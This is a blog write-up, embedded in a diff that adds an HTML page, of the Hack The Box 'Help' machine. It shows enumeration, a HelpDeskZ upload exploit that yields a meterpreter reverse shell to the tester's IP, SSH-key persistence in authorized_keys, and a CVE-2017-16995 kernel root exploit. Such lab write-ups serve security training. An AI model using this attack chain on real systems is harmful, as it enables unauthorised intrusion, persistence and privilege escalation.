@@ -1,0 +1,636 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Help - Hack The Box - hackcommander.io</title>
+<meta name="description" content="Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions such as PHP files but it doesn’t delete the file. Combined with a predictable filename generated based on MD5 of original file + epoch, we can get RCE.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="hackcommander.io">
+<meta property="og:title" content="Help - Hack The Box">
+<meta property="og:url" content="http://localhost:4000/htb-writeup-help/">
+
+
+  <meta property="og:description" content="Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions such as PHP files but it doesn’t delete the file. Combined with a predictable filename generated based on MD5 of original file + epoch, we can get RCE.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-writeup-help/help_logo.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2019-06-08T00:00:00+02:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-writeup-help/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "HackCommander",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="hackcommander.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Posts</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Help - Hack The Box</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="HackCommander" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">HackCommander</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, Bug Bounty Hunter <br>and CTF Player
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://www.linkedin.com/in/iv%C3%A1n-santos-malpica-1023a11b4" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> LinkedIn
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/hackcommander" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Help - Hack The Box">
+    <meta itemprop="description" content="Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions such as PHP files but it doesn’t delete the file. Combined with a predictable filename generated based on MD5 of original file + epoch, we can get RCE.">
+    <meta itemprop="datePublished" content="June 08, 2019">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Help - Hack The Box
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2019-06-08T00:00:00+02:00">June 08, 2019 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-writeup-help/help_logo.png" alt=""></p>
+
+<p>Help showed that a small programming mistake in a web application can introduce a critical security vulnerability. In this case, the PHP application errors out when uploading invalid extensions such as PHP files but it doesn’t delete the file. Combined with a predictable filename generated based on MD5 of original file + epoch, we can get RCE.</p>
+
+<h2 id="summary">Summary</h2>
+
+<ul>
+  <li>The HelpdeskZ PHP application allows .php file uploads to be stored even though there is an error message saying an invalid file has been uploaded. The PHP code doesn’t clean up the invalid file that has been uploaded.</li>
+  <li>We can’t simply execute the uploaded file because the filename stored is obfuscated with the MD5 of the original file + the epoch timestamp. We can bruteforce those with an exploit already available.</li>
+  <li>After getting a shell through RCE using the uploaded file, we execute a kernel exploit for CVE 2017-16995 and gain root access.</li>
+</ul>
+
+<h2 id="blog--tools-used">Blog / Tools used</h2>
+
+<ul>
+  <li><a href="https://www.exploit-db.com/exploits/41200">HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download</a></li>
+  <li><a href="https://www.exploit-db.com/exploits/44298">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation</a></li>
+</ul>
+
+<h3 id="portscan">Portscan</h3>
+
+<p>Not much running on there, it’s a Linux box with few services running:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~# nmap -p- -sC -sV 10.10.10.121
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-19 19:02 EST
+Nmap scan report for help.htb (10.10.10.121)
+Host is up (0.030s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<h3 id="web-enumeration-nodejs">Web enumeration Node.js</h3>
+
+<p><img src="/assets/images/htb-writeup-help/5.png" alt=""></p>
+
+<p>There’s some kind of Node.js application with graphql running on port 3000 but there’s not much we can do with it.</p>
+
+<p>Fails:</p>
+<ul>
+  <li>Tried enumerating ednpoints with wfuzz, didn’t find anything</li>
+  <li>Once I had access to the server later on I was able to find the <code class="language-plaintext highlighter-rouge">graphql</code> endpoint but couldn’t anything special with it other then querying user information which I already access to locally. The username/password shown here was not used anywhere on the box, just a distraction.</li>
+</ul>
+
+<h3 id="web-enumeration-apache">Web enumeration Apache</h3>
+
+<p>The main page shows the default Ubuntu Apache page:</p>
+
+<p><img src="/assets/images/htb-writeup-help/1.png" alt=""></p>
+
+<p>Next, when we run <code class="language-plaintext highlighter-rouge">gobuster</code> we find the <code class="language-plaintext highlighter-rouge">/support</code> URI:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># gobuster -w /usr/share/seclists/Discovery/Web-Content/big.txt -q -t 50 -u http://help.htb
+/javascript (Status: 301)
+/server-status (Status: 403)
+/support (Status: 301)
+</code></pre></div></div>
+
+<p>This points to the <strong>HelpdeskZ</strong> application running on the server.</p>
+
+<p><img src="/assets/images/htb-writeup-help/2.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-help/3.png" alt=""></p>
+
+<p>There’s nothing in the Knowledge Base or News section, and we can’t log in because we don’t have credentials.</p>
+
+<p>A quick search on Exploit-DB shows there’s a vulnerability related to file uploads:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@ragingunicorn:~# searchsploit helpdeskz
+------------------------------------------------
+ Exploit Title  |  Path  | (/usr/share/exploitdb/)
+------------------------------------------------
+HelpDeskZ 1.0.2 - Arbitrary File | exploits/php/webapps/40300.py
+HelpDeskZ &lt; 1.0.2 - (Authenticated) SQL Injection / Unauthorized File | exploits/php/webapps/41200.py
+------------------------------------------------
+Shellcodes: No Result
+</code></pre></div></div>
+
+<p>Exploit: <code class="language-plaintext highlighter-rouge">https://www.exploit-db.com/exploits/40300</code></p>
+
+<p>Basically, when we upload an attachment in a support ticket, the filename is obfuscated by doing an MD5 checksum of the filename concatenated with the epoch time. Because the code uses an integer for the epoch time (instead of a float), we can bruteforce the values by computing the MD5 value of every filename/time combination from the past few minutes and issue a GET request to the server to find if the filename is correct.</p>
+
+<p>Looking the HelpdeskZ code, we can see that the upload folder is <code class="language-plaintext highlighter-rouge">/support/uploads/tickets/</code>, this will need to be passed to the exploit script to bruteforce the correct path.</p>
+
+<p><img src="/assets/images/htb-writeup-help/6.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-help/7.png" alt=""></p>
+
+<p>We also need to make sure that the time on our computer is set to same time as the server, or close enough so the script will be able to cycle through the epoch time that matches the upload timestamp.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># date &amp;&amp; curl -v --head http://help.htb/
+Sun Jan 20 09:33:00 EST 2019
+*   Trying 10.10.10.121...
+* TCP_NODELAY set
+* Connected to help.htb (10.10.10.121) port 80 (#0)
+&gt; HEAD / HTTP/1.1
+&gt; Host: help.htb
+&gt; User-Agent: curl/7.62.0
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 200 OK
+HTTP/1.1 200 OK
+&lt; Date: Sun, 20 Jan 2019 14:32:37 GMT
+Date: Sun, 20 Jan 2019 14:32:37 GMT
+</code></pre></div></div>
+
+<p>For the reverse shell, we can can use a simple <code class="language-plaintext highlighter-rouge">php/meterpreter/reverse_tcp</code> shell and attach it to a support ticket:</p>
+
+<p><img src="/assets/images/htb-writeup-help/8.png" alt=""></p>
+
+<p><img src="/assets/images/htb-writeup-help/9.png" alt=""></p>
+
+<p>It seems that some extensions are blacklisted or whitelisted on the server. But if we look at the source code on Github, we notice that even when we get an error message, there is no code that deletes the invalid file. The file is still saved on the server even if we get an error message.</p>
+
+<p><img src="/assets/images/htb-writeup-help/10.png" alt=""></p>
+
+<p>To run the exploit, we just give it the upload location and the filename we uploaded:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ./40300.py http://help.htb/support/uploads/tickets/ cmd.php
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit
+</code></pre></div></div>
+
+<p>Once the script hits the right filename, the payload is triggered and we get a shell:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 exploit(multi/handler) &gt;
+[*] Sending encoded stage (51106 bytes) to 10.10.10.121
+[*] Meterpreter session 1 opened (10.10.14.23:5555 -&gt; 10.10.10.121:35166) at 2019-01-20 09:35:45 -0500
+</code></pre></div></div>
+
+<p>Now we can grab the flag and write our SSH key to the user folder so we can log in by SSH after:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; shell
+Process 17138 created.
+Channel 0 created.
+cd /home/help
+cat user.txt
+bb8a7b....
+mkdir .ssh
+echo "ssh-rsa AAAAB3NzaC1y[...]hscPOtelvd root@ragingunicorn" &gt;&gt; .ssh/authorized_keys
+</code></pre></div></div>
+
+<h3 id="privesc">Privesc</h3>
+
+<p>Since this is a low point box, the priv esc is probably something simple such as kernel exploit.</p>
+
+<p>We get a bunch of results when we run the <a href="https://github.com/mzet-/linux-exploit-suggester">Linux Exploit Suggester</a></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+[+] [CVE-2017-16995] eBPF_verifier
+
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Tags: debian=9,fedora=25|26|27,[ ubuntu=14.04|16.04|17.04 ]
+   Download URL: https://www.exploit-db.com/download/45010
+   Comments: CONFIG_BPF_SYSCALL needs to be set &amp;&amp; kernel.unprivileged_bpf_disabled != 1
+[...]
+</code></pre></div></div>
+
+<p>We can exploit CVE 2017-16995 to gain root access. According to the CVE’s description:</p>
+
+<blockquote>
+  <p>The check_alu_op function in kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect sign extension.</p>
+</blockquote>
+
+<p>Exploiting it was easy:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>help@help:~$ cd /dev/shm
+help@help:/dev/shm$ vi exp.c
+help@help:/dev/shm$ gcc -o exp exp.c
+help@help:/dev/shm$ ./exp
+task_struct = ffff880039afd400
+uidptr = ffff880036b75b04
+spawning root shell
+root@help:/dev/shm# cat /root/root.txt
+b7fe60...
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#apache" class="page__taxonomy-item" rel="tag">apache</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#helpdeskz" class="page__taxonomy-item" rel="tag">helpdeskz</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#kernel-exploit" class="page__taxonomy-item" rel="tag">kernel exploit</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">php</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-06-08T00:00:00+02:00">June 08, 2019</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-writeup-sizzle/" class="pagination--pager" title="Sizzle - Hack The Box
+">Previous</a>
+    
+    
+      <a href="/htb-writeup-flujab/" class="pagination--pager" title="Flujab - Hack The Box
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2022 HackCommander</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
